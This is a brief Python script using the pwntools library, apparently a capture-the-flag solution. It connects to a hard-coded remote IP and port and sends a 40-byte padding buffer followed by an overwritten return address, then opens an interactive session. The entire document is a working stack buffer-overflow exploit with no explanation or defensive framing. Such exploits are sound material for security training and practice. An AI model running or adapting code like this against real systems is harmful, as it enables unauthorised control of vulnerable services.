from pwn import *
p = remote('139.59.30.165', 8700)
p.recvuntil('>>>')
call = 0x400766
payload = ""
payload += "A"*40
payload += p64(call)
p.sendline(payload)
p.recv()
p.interactive()